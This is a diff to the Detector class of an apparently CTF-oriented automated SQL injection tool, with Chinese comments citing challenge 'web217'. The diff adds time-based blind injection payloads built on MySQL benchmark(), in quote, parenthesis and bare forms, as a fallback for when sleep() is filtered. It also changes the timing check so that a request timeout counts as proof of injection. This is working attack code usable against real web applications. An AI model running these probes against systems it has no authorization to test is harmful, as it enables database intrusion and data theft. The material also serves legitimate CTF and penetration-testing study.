@@ -158,6 +158,10 @@ class Detector:
             ("", f"{base} and sleep(4)#"),
             ("'", f"{base}'and sleep(4)#"),
             (")", f"{base})and(sleep(4))#"),
+            # sleep 被目标拦（web217）→ benchmark 变体（迭代数压在请求超时内）
+            ("", f"{base} or benchmark(1000000,md5(0x616263))#"),
+            ("'", f"{base}'or benchmark(1000000,md5(0x616263))#"),
+            (")", f"{base})or(benchmark(1000000,md5(0x616263)))#"),
         ]
         for closure, payload in probes:
             if self.s.stopped:
@@ -165,7 +169,13 @@ class Detector:
             t0 = _t.perf_counter()
             r = self._send(payload)
             dt = _t.perf_counter() - t0
-            if r.status_code < 0 or dt < 3.5:
+            if r.status_code < 0:
+                # 请求超时本身即延时证据：benchmark 类长延时会把读超时撑爆
+                if dt >= 3.5 and "timed out" in str(r.body).lower():
+                    pass
+                else:
+                    continue
+            elif dt < 3.5:
                 continue
             inj = InjectionPoint(param=self.s.spec.param, base_value=base,
                                  numeric=(closure == ""), closure=closure)
